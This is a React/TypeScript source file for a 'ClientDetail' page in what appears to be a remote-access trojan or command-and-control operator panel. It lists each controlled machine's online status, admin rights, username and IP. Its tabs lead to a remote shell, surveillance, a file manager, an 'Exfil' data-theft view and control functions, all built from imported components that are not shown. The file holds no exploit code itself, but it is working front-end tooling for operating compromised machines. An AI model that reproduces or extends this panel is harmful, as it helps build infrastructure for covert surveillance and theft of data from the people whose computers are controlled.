import { useState } from "react";
import { useParams, useNavigate, useLocation } from "react-router-dom";
import { useClient } from "@/hooks/useClients";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Badge } from "@/components/ui/badge";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Skeleton } from "@/components/ui/skeleton";
import { Monitor, Cpu, TerminalSquare, FolderOpen, Eye, Settings, ArrowLeft, Database } from "lucide-react";
import SystemInfoTab from "@/components/client/SystemInfoTab";
import RemoteShellTab from "@/components/client/RemoteShellTab";
import FileManagerTab from "@/components/client/FileManagerTab";
import SurveillanceTab from "@/components/client/SurveillanceTab";
import ControlTab from "@/components/client/ControlTab";
import ExfilTab from "@/components/client/ExfilTab";
import { formatDistanceToNow } from "date-fns";

const VALID_TABS = ["sysinfo", "shell", "surveillance", "files", "exfil", "control"] as const;

function isOnline(lastSeen: string | null) {
  if (!lastSeen) return false;
  return Date.now() - new Date(lastSeen).getTime() < 120 * 1000;
}

function isIdle(lastSeen: string | null) {
  if (!lastSeen) return false;
  const diff = Date.now() - new Date(lastSeen).getTime();
  return diff >= 120 * 1000 && diff < 5 * 60 * 1000;
}

const ClientDetail = () => {
  const { machineId } = useParams<{ machineId: string }>();
  const { data: client, isLoading } = useClient(machineId || "");
  const navigate = useNavigate();
  const location = useLocation();

  // Persist active tab in URL hash so re-renders don't reset to sysinfo
  const hashTab = location.hash.replace("#", "");
  const initialTab = VALID_TABS.includes(hashTab as typeof VALID_TABS[number]) ? hashTab : "sysinfo";
  const [activeTab, setActiveTab] = useState(initialTab);

  const onTabChange = (value: string) => {
    setActiveTab(value);
    window.history.replaceState(null, "", `${location.pathname}#${value}`);
  };

  if (isLoading) {
    return (
      <div className="space-y-4">
        <div className="flex items-center gap-3">
          <Skeleton className="w-10 h-10 rounded-lg" />
          <div className="space-y-2">
            <Skeleton className="w-48 h-5" />
            <Skeleton className="w-72 h-3" />
          </div>
        </div>
        <Skeleton className="w-full h-10 rounded-lg" />
        <Skeleton className="w-full h-96 rounded-lg" />
      </div>
    );
  }

  if (!client) {
    return (
      <div className="flex flex-col items-center justify-center h-[60vh] text-muted-foreground">
        <Monitor className="w-12 h-12 mb-3 opacity-20" />
        <p className="font-medium">Client not found</p>
        <Button variant="ghost" className="mt-3 gap-2" onClick={() => navigate("/")}>
          <ArrowLeft className="w-4 h-4" /> Back to Dashboard
        </Button>
      </div>
    );
  }

  const online = isOnline(client.last_seen);
  const idle = isIdle(client.last_seen);

  return (
    <div className="space-y-4">
      <Card className="p-4 border-border/30">
        <div className="flex items-center justify-between flex-wrap gap-4">
          <div className="flex items-center gap-3">
            <Button
              variant="ghost"
              size="icon"
              className="h-8 w-8 text-muted-foreground hover:text-foreground"
              onClick={() => navigate("/")}
            >
              <ArrowLeft className="w-4 h-4" />
            </Button>
            <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center">
              <Monitor className="w-5 h-5 text-primary" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-lg font-semibold">
                  {client.machine_name || client.machine_id}
                </h1>
                <Badge
                  className={`text-[10px] ${
                    online
                      ? "bg-emerald-500/15 text-emerald-400 border-emerald-500/20"
                      : idle
                      ? "bg-amber-500/15 text-amber-400 border-amber-500/20"
                      : "bg-gray-500/15 text-gray-400 border-gray-500/20"
                  }`}
                >
                  <span
                    className={`w-1.5 h-1.5 rounded-full mr-1 ${
                      online ? "bg-emerald-500" : idle ? "bg-amber-500 animate-pulse" : "bg-gray-500"
                    }`}
                  />
                  {online ? "Online" : idle ? "Idle" : "Offline"}
                </Badge>
                {client.is_admin && (
                  <Badge className="text-[10px] bg-red-500/15 text-red-400 border-red-500/20">
                    ADMIN
                  </Badge>
                )}
              </div>
              <p className="text-xs text-muted-foreground mt-0.5">
                {client.username}@{client.ip} · {client.os} · Last seen{" "}
                {client.last_seen
                  ? formatDistanceToNow(new Date(client.last_seen), { addSuffix: true })
                  : "never"}
              </p>
            </div>
          </div>
          <code className="text-[10px] text-muted-foreground/50 font-mono bg-muted/30 px-2 py-1 rounded">
            {client.machine_id}
          </code>
        </div>
      </Card>

      <Tabs value={activeTab} onValueChange={onTabChange} className="space-y-4">
        <TabsList className="bg-muted/30 border border-border/20 p-0.5">
          <TabsTrigger value="sysinfo" className="gap-1.5 text-xs data-[state=active]:bg-card">
            <Cpu className="w-3.5 h-3.5" /> System
          </TabsTrigger>
          <TabsTrigger value="shell" className="gap-1.5 text-xs data-[state=active]:bg-card">
            <TerminalSquare className="w-3.5 h-3.5" /> Shell
          </TabsTrigger>
          <TabsTrigger value="surveillance" className="gap-1.5 text-xs data-[state=active]:bg-card">
            <Eye className="w-3.5 h-3.5" /> Surveillance
          </TabsTrigger>
          <TabsTrigger value="files" className="gap-1.5 text-xs data-[state=active]:bg-card">
            <FolderOpen className="w-3.5 h-3.5" /> Files
          </TabsTrigger>
          <TabsTrigger value="exfil" className="gap-1.5 text-xs data-[state=active]:bg-card">
            <Database className="w-3.5 h-3.5" /> Exfil
          </TabsTrigger>
          <TabsTrigger value="control" className="gap-1.5 text-xs data-[state=active]:bg-card">
            <Settings className="w-3.5 h-3.5" /> Control
          </TabsTrigger>
        </TabsList>

        <TabsContent value="sysinfo">
          <SystemInfoTab machineId={client.machine_id} clientOs={client.os} />
        </TabsContent>
        <TabsContent value="shell" forceMount className="data-[state=inactive]:hidden">
          <RemoteShellTab machineId={client.machine_id} machineName={client.machine_name || client.machine_id} clientOs={client.os} />
        </TabsContent>
        <TabsContent value="surveillance">
          <SurveillanceTab machineId={client.machine_id} clientOs={client.os} />
        </TabsContent>
        <TabsContent value="files">
          <FileManagerTab machineId={client.machine_id} clientOs={client.os} />
        </TabsContent>
        <TabsContent value="exfil">
          <ExfilTab machineId={client.machine_id} clientOs={client.os} />
        </TabsContent>
        <TabsContent value="control">
          <ControlTab machineId={client.machine_id} machineName={client.machine_name || client.machine_id} clientOs={client.os} />
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default ClientDetail;
